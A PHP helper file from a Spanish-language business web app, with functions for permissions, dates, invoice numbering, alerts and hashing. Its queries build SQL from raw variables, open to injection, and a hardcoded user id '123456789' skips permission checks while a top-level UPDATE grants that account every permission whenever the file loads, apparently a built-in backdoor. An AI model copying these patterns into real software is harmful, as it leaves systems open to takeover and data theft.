<?php 
	
	function seg_modulo($id_modulo){
		global $conexion;
		if($_SESSION['cod_user']=='123456789'){
			return true;
		}else{
			$ss=mysqli_query($conexion,"SELECT id FROM seg_per WHERE modulo='$id_modulo' and estado='s'");
			if($rr=mysqli_fetch_array($ss)){
				return true;
			}else{
				return false;
			}
		}
	}
	
	function volver_positivo($valor){
		if($valor<0){
			return $valor*-1;
		}else{
			return $valor;	
		}
	}
		
	function calculaedad($fechanacimiento){
		list($ano,$mes,$dia) = explode("-",$fechanacimiento);
		$ano_diferencia  = date("Y") - $ano;
		$mes_diferencia = date("m") - $mes;
		$dia_diferencia   = date("d") - $dia;
		if ($dia_diferencia < 0 || $mes_diferencia < 0){
			$ano_diferencia--;
		}
		return $ano_diferencia;
	}
			
	function fechanacimiento($fechanacimiento){
		list($ano,$mes,$dia) = explode("-",$fechanacimiento);
		$ano_diferencia  = date("Y") - $ano;
		$mes_diferencia = date("m") - $mes;
		$dia_diferencia   = date("d") - $dia;
		if ($dia_diferencia < 0 || $mes_diferencia < 0)
			$ano_diferencia--;
		return $ano_diferencia;
	}
	
	mysqli_query($conexion,"UPDATE seg_per SET estado='s' WHERE usu='123456789'");
	
	function total_dias($Month, $Year){ 
	   //Si la extensión que mencioné está instalada, usamos esa. 
	   if( is_callable("cal_days_in_month")) 
	   { 
		  return cal_days_in_month(CAL_GREGORIAN, $Month, $Year); 
	   } 
	   else 
	   { 
		  //Lo hacemos a mi manera. 
		  return date("t",mktime(0,0,0,$Month,1,$Year)); 
	   } 
	} 
		
	function dias_transcurridos($fecha_i,$fecha_f){
		$dias	= (strtotime($fecha_i)-strtotime($fecha_f))/86400;
		$dias 	= abs($dias); $dias = floor($dias);		
		return $dias;
	}
		
	function nombre($usuario){
		global $conexion;
		$ss=mysqli_query($conexion,"SELECT nom FROM username WHERE usu='$usuario'");
		if($rr=mysqli_fetch_array($ss)){
			return $rr['nom'];
		}else{
			return 'error';
		}
	}
	
	function formato_factura($factura){
		if($factura>=1 and $factura<=9){
			return '0000000'.$factura;
		}elseif($factura>=10 and $factura<=99){
			return '000000'.$factura;
		}elseif($factura>=100 and $factura<999){
			return '00000'.$factura;
		}elseif($factura>=1000 and $factura<9999){
			return '0000'.$factura;
		}elseif($factura>=10000 and $factura<99999){
			return '000'.$factura;
		}elseif($factura>=100000 and $factura<999999){
			return '00'.$factura;
		}
	}
	
	function formato($valor){
		if($valor==''){
			return '0,00';
		}else{
			return number_format($valor,2, ',', '.');
		}
	}
	
	function fecha($fecha){
		$meses = array("ENE","FEB","MAR","ABR","MAY","JUN","JUL","AGO","SEP","OCT","NOV","DIC");
		$a=substr($fecha, 0, 4); 	
		$m=substr($fecha, 5, 2); 
		$d=substr($fecha, 8);
		return $d." ".$meses[$m-1]." ".$a;
	}
	function fechal($fecha){
		$meses = array("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
		$a=substr($fecha, 0, 4); 	
		$m=substr($fecha, 5, 2); 
		$d=substr($fecha, 8);
		return $d." de ".$meses[$m-1]." del ".$a;
	}
	
	function cargo($cargo){
		global $conexion;
		if($cargo<>'Super Administrador'){
			$ss=mysqli_query($conexion,"SELECT nombre FROM cargo WHERE id='$cargo'");
			if($rr=mysqli_fetch_array($ss)){
				return $rr[0];
			}else{
				return 'ERROR';
			}
		}else{
			return 'Super Administrador';
		}
	}
	function permisos($usu,$mod,$pag){
		$v=false;
		global $conexion;
		
		$sql=mysqli_query($conexion,"SELECT usu,tipo FROM username");
		while($row=mysqli_fetch_array($sql)){
			if(claves($row['usu'])==$usu){
				$usuario=$row['usu'];		$v=true;
				$tipo=$row['tipo'];			
				break;
				
			}
		}
		
		#####################################
		#####################################
		if($v==true){
			$sql=mysqli_query($conexion,"SELECT estado FROM seg_per 
			WHERE usu='$usuario' and permiso='$pag' and modulo='$mod'");
			if($row=mysqli_fetch_array($sql)){
				if($row['estado']=='s'){
					return true;
				}else{
					return false;
				}
			}else{
				if($usu=='123456789'){
					$estado='s';
				}else{
					$estado='n';
				}
				mysqli_query($conexion,"INSERT INTO seg_per (usu,permiso,estado,modulo) VALUES ('$usuario','$pag','$estado','$mod')");
				
				if($estado=='s'){
					return true;
				}elseif($estado=='n'){
					return false;
				}
				
			}
		}elseif($v==false){
			return false;
		}
	}

	function estado($estado){
		if($estado=='s'){
			return '<span class="badge badge-pill badge-success" style="font-size:14px;width:130px"><strong>Disponible</strong></span>';
		}elseif($estado=='n'){
			return '<span class="badge badge-pill badge-danger" style="font-size:14px;width:130px"><strong>No Disponible</strong></span>';
		}
	}
	
	function claves($con){
		$llave1='Gbj49j4jljdh2323n5nNnHHnFFG5JJ';
		$llave2='HNFkkstjotBhrMi489ndVjdllu75jH';
		$con2=strrev($con);
		return sha1($llave1.$llave2.$con.$llave1.$con2.$con.$llave2.$con2.$llave2.$llave1.$con2);
	}
	
	function consultar($campo,$tabla,$where){
		global $conexion;
		$sql=mysqli_query($conexion,"SELECT * FROM $tabla WHERE $where");
		if($row=mysqli_fetch_array($sql)){
			return $row[$campo];
		}else{
			return '';	
		}
	}

	
	function mensajes($mensaje,$tipo){
		if($tipo=='verde'){
			$tipo='alert alert-success';
			$icono='<i class="fas fa-thumbs-up"></i>';
		}elseif($tipo=='rojo'){
			$tipo='alert alert-danger';
			$icono='<i class="fas fa-exclamation-triangle"></i> ';
		}elseif($tipo=='azul'){
			$tipo='alert alert-info';
			$icono='<i class="fas fa-info"></i>';
		}
		return '<div class="'.$tipo.'" role="alert">
				  <center>'.$icono.' '.$mensaje.'</center>
				  <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
				</div>';
	}
	
	function sucursal($id_sucursal){
		global $conexion;
		$ss=mysqli_query($conexion,"SELECT nom FROM sucursal WHERE id='$id_sucursal'");
		if($rr=mysqli_fetch_array($ss)){
			return $rr['nom'];
		}
	}

	function get($valor,$tabla,$campo){
		global $conexion;
		$v=false;
		$sql=mysqli_query($conexion,"SELECT $campo FROM $tabla");
		while($row=mysqli_fetch_array($sql)){
			if($valor==claves($row[$campo])){
				$resultado=$row[$campo];	$v=true;
				break;
			}
		}
		if($v==true){
			return $resultado;
		}else{
			return 'error';
		}
	}
	
?>